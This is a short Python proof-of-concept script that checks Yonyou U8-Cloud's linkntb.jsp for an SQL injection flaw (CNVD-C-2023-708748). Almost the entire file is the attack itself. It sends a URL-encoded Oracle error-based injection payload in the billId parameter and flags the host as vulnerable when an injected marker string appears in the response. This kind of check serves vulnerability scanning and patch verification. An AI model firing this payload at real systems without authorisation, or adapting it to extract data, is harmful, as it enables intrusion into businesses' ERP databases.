import requests
import urllib

def verify(url):
    relsult = {
        'name': '用友U8-Cloud-linkntb.jsp存在SQL注入漏洞(CNVD-C-2023-708748)',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Content-Type': 'text/plain; charset=UTF-8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Connection': 'keep-alive'
    }
    vurl = urllib.parse.urljoin(url, "/yer/html/nodes/linkntb/linkntb.jsp?pageId=linkntb&billId=1%27%29+AND+5846%3DUTL_INADDR.GET_HOST_ADDRESS%28CHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28113%29%7C%7CCHR%28120%29%7C%7CCHR%28113%29%7C%7C%28SELECT+%28CASE+WHEN+%285846%3D5846%29+THEN+1+ELSE+0+END%29+FROM+DUAL%29%7C%7CCHR%28113%29%7C%7CCHR%28107%29%7C%7CCHR%28107%29%7C%7CCHR%28118%29%7C%7CCHR%28113%29%29--+Astq&djdl=1&rand=1")
    try:
        response = requests.get(vurl, headers=headers)
        if response.status_code == 200 and 'qkqxq' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult